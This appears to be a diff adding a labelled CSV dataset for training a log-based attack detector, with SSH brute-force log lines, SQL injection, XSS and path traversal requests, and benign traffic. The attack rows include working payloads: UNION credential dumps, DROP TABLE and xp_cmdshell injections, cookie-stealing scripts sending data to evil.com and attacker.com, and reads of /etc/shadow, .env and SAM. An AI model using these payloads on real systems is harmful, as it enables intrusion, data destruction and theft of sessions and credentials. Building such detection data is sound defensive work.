@@ -1,0 +1,224 @@
+text,label
+Failed password for root from 192.168.1.100 port 22 ssh2,ssh_brute_force
+Failed password for admin from 10.0.0.5 port 22 ssh2,ssh_brute_force
+Failed password for user from 172.16.0.1 port 22 ssh2,ssh_brute_force
+Failed password for root from 203.0.113.50 port 22 ssh2,ssh_brute_force
+Failed password for root from 198.51.100.23 port 22 ssh2,ssh_brute_force
+Failed password for invalid user test from 10.0.0.1 port 22 ssh2,ssh_brute_force
+Failed password for invalid user guest from 192.168.0.10 port 22 ssh2,ssh_brute_force
+Failed password for invalid user oracle from 10.10.10.1 port 22 ssh2,ssh_brute_force
+Failed password for invalid user postgres from 172.16.5.5 port 22 ssh2,ssh_brute_force
+Failed password for invalid user ubuntu from 192.168.100.1 port 22 ssh2,ssh_brute_force
+Invalid user admin from 10.0.0.1 port 22,ssh_brute_force
+Invalid user test from 192.168.1.50 port 22,ssh_brute_force
+Invalid user root from 203.0.113.10 port 22,ssh_brute_force
+Invalid user guest from 198.51.100.5 port 22,ssh_brute_force
+Invalid user deploy from 172.16.0.100 port 22,ssh_brute_force
+Invalid user mysql from 10.0.0.50 port 22,ssh_brute_force
+Invalid user ftpuser from 192.168.10.10 port 22,ssh_brute_force
+Invalid user pi from 10.10.0.1 port 22,ssh_brute_force
+Connection closed by authenticating user root 192.168.1.100 port 22,ssh_brute_force
+Connection closed by authenticating user admin 10.0.0.5 port 22,ssh_brute_force
+Connection closed by authenticating user test 172.16.0.1 port 22,ssh_brute_force
+Connection closed by authenticating user user 203.0.113.50 port 22,ssh_brute_force
+pam_unix(sshd:auth): authentication failure; logname= uid=0 euid=0 ruser= rhost=192.168.1.100 user=root,ssh_brute_force
+pam_unix(sshd:auth): authentication failure; logname= uid=0 ruser= rhost=10.0.0.5 user=admin,ssh_brute_force
+pam_unix(sshd:auth): authentication failure; rhost=172.16.0.50 user=root,ssh_brute_force
+pam_unix(sshd:auth): authentication failure; rhost=203.0.113.10 user=test,ssh_brute_force
+sshd[12345]: Failed password for root from 192.168.1.1 port 54321 ssh2,ssh_brute_force
+sshd[23456]: Failed password for admin from 10.0.0.100 port 43210 ssh2,ssh_brute_force
+sshd[34567]: Failed password for user from 172.16.1.1 port 32100 ssh2,ssh_brute_force
+sshd[45678]: Failed password for root from 203.0.113.5 port 21000 ssh2,ssh_brute_force
+maximum authentication attempts exceeded for root from 192.168.1.100 port 22 ssh2,ssh_brute_force
+maximum authentication attempts exceeded for admin from 10.0.0.5 port 22 ssh2,ssh_brute_force
+maximum authentication attempts exceeded for user from 172.16.0.1 port 22,ssh_brute_force
+Disconnecting: Too many authentication failures for root from 10.0.0.1 port 22,ssh_brute_force
+Disconnecting: Too many authentication failures for admin from 192.168.1.50 port 22,ssh_brute_force
+Received disconnect from 192.168.1.100 port 22:11: Bye Bye,ssh_brute_force
+Received disconnect from 10.0.0.5 port 22:11: Bye Bye,ssh_brute_force
+error: maximum authentication attempts exceeded for root from 10.0.0.1 port 22,ssh_brute_force
+error: maximum authentication attempts exceeded for admin from 172.16.0.1 port 22,ssh_brute_force
+Failed publickey for root from 192.168.1.100 port 22 ssh2,ssh_brute_force
+Failed publickey for admin from 10.0.0.5 port 22 ssh2,ssh_brute_force
+sshd: pam_authenticate failed for root from 192.168.1.100,ssh_brute_force
+sshd: pam_authenticate failed for admin from 10.0.0.5,ssh_brute_force
+reverse mapping checking getaddrinfo for attacker.example.com failed - POSSIBLE BREAK-IN ATTEMPT from 192.168.1.100,ssh_brute_force
+Bad protocol version identification from 192.168.1.100 port 22,ssh_brute_force
+Did not receive identification string from 10.0.0.5,ssh_brute_force
+Unable to negotiate with 192.168.1.100 port 22: no matching key exchange method found,ssh_brute_force
+input_userauth_request: invalid user admin from 10.0.0.5,ssh_brute_force
+Failed keyboard-interactive/pam for root from 192.168.1.100 port 22 ssh2,ssh_brute_force
+Failed keyboard-interactive/pam for admin from 10.0.0.5 port 22 ssh2,ssh_brute_force
+Failed none for invalid user root from 203.0.113.50 port 22 ssh2,ssh_brute_force
+GET /products?id=1 UNION SELECT username password FROM users--,sqli
+GET /page?id=1 UNION SELECT null username password FROM users,sqli
+GET /search?q=1 UNION ALL SELECT table_name FROM information_schema.tables,sqli
+GET /api/user?id=1 UNION SELECT credit_card FROM payments--,sqli
+POST /login username=admin' OR 1=1--&password=test,sqli
+POST /login username=admin' OR '1'='1'--&password=x,sqli
+GET /page?id=1' OR '1'='1,sqli
+GET /search?q=' OR 1=1 --,sqli
+GET /items?id=1' OR 'a'='a,sqli
+GET /products?cat=1' OR ''='--,sqli
+GET /page?id=1; DROP TABLE users--,sqli
+GET /api?q=1; DELETE FROM sessions--,sqli
+POST /form data=1; UPDATE users SET role='admin'--,sqli
+GET /page?id=1; INSERT INTO admin VALUES('hacker' 'pass')--,sqli
+GET /search?q=1; EXEC xp_cmdshell('whoami')--,sqli
+GET /page?id=1' AND 1=1--,sqli
+GET /page?id=1' AND 1=2--,sqli
+GET /page?id=1' AND SUBSTRING(username 1 1)='a'--,sqli
+GET /page?id=1' AND (SELECT COUNT(*) FROM users)>0--,sqli
+GET /page?id=1' AND ASCII(SUBSTRING((SELECT password FROM users LIMIT 1) 1 1))>64--,sqli
+GET /page?id=1' AND SLEEP(5)--,sqli
+GET /page?id=1' WAITFOR DELAY '0:0:5'--,sqli
+GET /page?id=1' AND BENCHMARK(5000000 MD5('test'))--,sqli
+GET /page?id=1'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END--,sqli
+GET /search?q=1' AND IF(1=1 SLEEP(5) 0)--,sqli
+GET /page?id=1' AND EXTRACTVALUE(1 CONCAT(0x7e (SELECT version())))--,sqli
+GET /page?id=1' AND UPDATEXML(1 CONCAT(0x7e (SELECT user())) 1)--,sqli
+GET /page?id=1 AND 1=CONVERT(int (SELECT @@version))--,sqli
+GET /search?q=1' AND (SELECT 1 FROM(SELECT COUNT(*) CONCAT(version() 0x3a FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a)--,sqli
+GET /page?id=1%27%20UNION%20SELECT%20password%20FROM%20users--%20,sqli
+GET /page?id=1%27%20OR%201%3D1--,sqli
+GET /search?q=%27%20OR%20%271%27%3D%271,sqli
+POST /api/data input=1%27%3B%20DROP%20TABLE%20users--,sqli
+GET /page?id=1' UNION SELECT GROUP_CONCAT(table_name) FROM information_schema.tables WHERE table_schema=database()--,sqli
+GET /page?id=1' UNION SELECT GROUP_CONCAT(column_name) FROM information_schema.columns WHERE table_name='users'--,sqli
+GET /api?q=admin'/**/UNION/**/SELECT/**/password/**/FROM/**/users--,sqli
+GET /page?id=1'/**/OR/**/1=1--,sqli
+POST /login user=admin' HAVING 1=1--&pass=x,sqli
+GET /page?id=1' ORDER BY 10--,sqli
+GET /search?q=1' GROUP BY 1 HAVING 1=1--,sqli
+POST /api/query sql=SELECT * FROM users WHERE id=1 OR 1=1,sqli
+GET /page?id=-1' UNION SELECT LOAD_FILE('/etc/passwd')--,sqli
+GET /page?id=1' UNION SELECT null CONCAT(user() 0x3a version())--,sqli
+GET /products?id=1' UNION SELECT schema_name FROM information_schema.schemata--,sqli
+POST /search query=test' UNION SELECT password FROM admin_users--,sqli
+GET /items?filter=1' AND (SELECT * FROM (SELECT(SLEEP(5)))abc)--,sqli
+GET /page?id=1' UNION SELECT null null null INTO OUTFILE '/tmp/test'--,sqli
+GET /api?id=1'; SHOW DATABASES--,sqli
+GET /data?id=1' UNION SELECT hex(password) FROM users--,sqli
+POST /form field=1';SHUTDOWN--,sqli
+GET /page?id=1 UNION SELECT ALL password hash FROM credentials--,sqli
+GET /page?q=<script>alert('xss')</script>,xss
+GET /search?q=<script>document.location='http://evil.com/steal?c='+document.cookie</script>,xss
+GET /page?q=<script>new Image().src='http://attacker.com/log?c='+document.cookie</script>,xss
+GET /page?name=<script>alert(document.domain)</script>,xss
+GET /search?q=<img src=x onerror=alert('xss')>,xss
+GET /page?q=<img src=x onerror=alert(document.cookie)>,xss
+GET /search?q=<svg onload=alert('xss')>,xss
+GET /page?q=<svg/onload=alert(1)>,xss
+GET /page?q=<body onload=alert('xss')>,xss
+GET /search?q=<input onfocus=alert('xss') autofocus>,xss
+GET /page?q=<iframe src=javascript:alert('xss')>,xss
+GET /search?q=<iframe src="javascript:alert('xss')"></iframe>,xss
+POST /comment body=<script>fetch('http://evil.com/steal' {method:'POST' body:document.cookie})</script>,xss
+POST /message content=<img src=x onerror="fetch('http://evil.com/?c='+document.cookie)">,xss
+POST /profile bio=<svg onload="new Image().src='http://evil.com/log?'+document.cookie">,xss
+POST /review text=<script>var x=new XMLHttpRequest();x.open('GET' 'http://evil.com/?c='+document.cookie);x.send()</script>,xss
+POST /comment body=<div onmouseover="alert('xss')">hover me</div>,xss
+GET /page?q=<script>eval(atob('YWxlcnQoJ3hzcycp'))</script>,xss
+GET /search?q=<script>window['al'+'ert']('xss')</script>,xss
+GET /page?q=<script>document['write']('<img src=x onerror=alert(1)>')</script>,xss
+GET /page?q=javascript:alert('xss'),xss
+GET /redirect?url=javascript:alert(document.cookie),xss
+GET /page?q=%3Cscript%3Ealert('xss')%3C/script%3E,xss
+GET /search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E,xss
+GET /page?q=%3Csvg%20onload%3Dalert('xss')%3E,xss
+GET /page?q=<details open ontoggle=alert('xss')>,xss
+GET /search?q=<marquee onstart=alert('xss')>,xss
+GET /page?q=<video src=x onerror=alert('xss')>,xss
+GET /page?q=<audio src=x onerror=alert('xss')>,xss
+POST /comment body=<script src=http://evil.com/malicious.js></script>,xss
+GET /page?q='><script>alert(String.fromCharCode(88 83 83))</script>,xss
+GET /search?q="><img src=x onerror=prompt('xss')>,xss
+POST /form field=<script>document.forms[0].action='http://evil.com/phish'</script>,xss
+GET /page?q=<meta http-equiv="refresh" content="0;url=javascript:alert('xss')">,xss
+GET /search?q=<object data="javascript:alert('xss')">,xss
+GET /page?q=<embed src="javascript:alert('xss')">,xss
+GET /page?q=<a href="javascript:alert('xss')">click</a>,xss
+GET /page?q=<form action="javascript:alert('xss')"><input type=submit></form>,xss
+GET /search?q=<style>@import'javascript:alert(1)'</style>,xss
+POST /api/data input=<script>while(1){alert('dos')}</script>,xss
+GET /page?file=../../../../etc/passwd,path_traversal
+GET /page?file=../../../etc/shadow,path_traversal
+GET /download?path=../../etc/passwd,path_traversal
+GET /static?file=../../../etc/hosts,path_traversal
+GET /api/file?name=../../../../etc/nginx/nginx.conf,path_traversal
+GET /page?file=....//....//....//etc/passwd,path_traversal
+GET /download?path=....//....//etc/shadow,path_traversal
+GET /page?file=..%2F..%2F..%2F..%2Fetc%2Fpasswd,path_traversal
+GET /download?path=..%2F..%2Fetc%2Fshadow,path_traversal
+GET /api/file?name=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd,path_traversal
+GET /page?file=..%252F..%252F..%252Fetc%252Fpasswd,path_traversal
+GET /page?file=..\/..\/..\/etc/passwd,path_traversal
+GET /download?path=..\..\..\..\windows\system32\config\sam,path_traversal
+GET /page?file=..\..\..\..\windows\win.ini,path_traversal
+GET /api/file?name=..\..\boot.ini,path_traversal
+GET /page?file=....\\....\\....\\windows\\system32\\drivers\\etc\\hosts,path_traversal
+GET /page?file=/etc/passwd,path_traversal
+GET /download?path=/etc/shadow,path_traversal
+GET /api/file?name=/proc/self/environ,path_traversal
+GET /page?file=/proc/version,path_traversal
+GET /download?path=/var/log/auth.log,path_traversal
+GET /page?file=....//....//....//....//proc/self/cmdline,path_traversal
+GET /download?path=..%00/etc/passwd,path_traversal
+GET /page?file=../../../etc/passwd%00.jpg,path_traversal
+GET /api/file?name=../../../../etc/passwd%00.png,path_traversal
+GET /page?file=..%c0%af..%c0%af..%c0%afetc/passwd,path_traversal
+GET /download?path=..%ef%bc%8f..%ef%bc%8fetc/passwd,path_traversal
+GET /static/../../../etc/passwd,path_traversal
+GET /images/../../config/database.yml,path_traversal
+GET /assets/../../../.env,path_traversal
+GET /index.html HTTP/1.1 200 OK,normal
+GET /style.css HTTP/1.1 200 OK,normal
+GET /script.js HTTP/1.1 200 OK,normal
+GET /favicon.ico HTTP/1.1 200 OK,normal
+GET /images/logo.png HTTP/1.1 200 OK,normal
+GET /api/health HTTP/1.1 200 OK,normal
+GET /api/status HTTP/1.1 200 OK,normal
+GET /robots.txt HTTP/1.1 200 OK,normal
+GET /sitemap.xml HTTP/1.1 200 OK,normal
+POST /api/login HTTP/1.1 200 OK,normal
+POST /api/register HTTP/1.1 201 Created,normal
+GET /api/users/profile HTTP/1.1 200 OK,normal
+GET /api/products HTTP/1.1 200 OK,normal
+GET /api/products/123 HTTP/1.1 200 OK,normal
+POST /api/orders HTTP/1.1 201 Created,normal
+GET /dashboard HTTP/1.1 200 OK,normal
+GET /about HTTP/1.1 200 OK,normal
+GET /contact HTTP/1.1 200 OK,normal
+GET /docs HTTP/1.1 200 OK,normal
+GET /api/v1/metrics HTTP/1.1 200 OK,normal
+Accepted password for admin from 10.0.0.1 port 22 ssh2,normal
+Accepted publickey for deploy from 192.168.1.50 port 22 ssh2,normal
+session opened for user admin by (uid=0),normal
+session opened for user deploy by (uid=1000),normal
+session closed for user admin,normal
+session closed for user deploy,normal
+pam_unix(sshd:session): session opened for user root by (uid=0),normal
+pam_unix(sshd:session): session closed for user root,normal
+New session 1 of user admin,normal
+Removed session 1,normal
+GET /fonts/roboto.woff2 HTTP/1.1 200 OK,normal
+GET /manifest.json HTTP/1.1 200 OK,normal
+GET /api/notifications HTTP/1.1 200 OK,normal
+POST /api/feedback HTTP/1.1 201 Created,normal
+GET /api/search?q=products HTTP/1.1 200 OK,normal
+GET /api/categories HTTP/1.1 200 OK,normal
+PUT /api/users/settings HTTP/1.1 200 OK,normal
+DELETE /api/sessions/old HTTP/1.1 204 No Content,normal
+GET /api/dashboard/stats HTTP/1.1 200 OK,normal
+GET /api/reports/monthly HTTP/1.1 200 OK,normal
+HEAD / HTTP/1.1 200 OK,normal
+OPTIONS /api/data HTTP/1.1 204 No Content,normal
+GET /service-worker.js HTTP/1.1 200 OK,normal
+GET /static/bundle.js HTTP/1.1 200 OK,normal
+GET /static/vendor.js HTTP/1.1 200 OK,normal
+GET /static/main.css HTTP/1.1 200 OK,normal
+GET /assets/images/banner.jpg HTTP/1.1 200 OK,normal
+POST /api/upload HTTP/1.1 200 OK,normal
+GET /api/files/document.pdf HTTP/1.1 200 OK,normal
+GET /healthcheck HTTP/1.1 200 OK,normal
+GET /ping HTTP/1.1 200 OK,normal
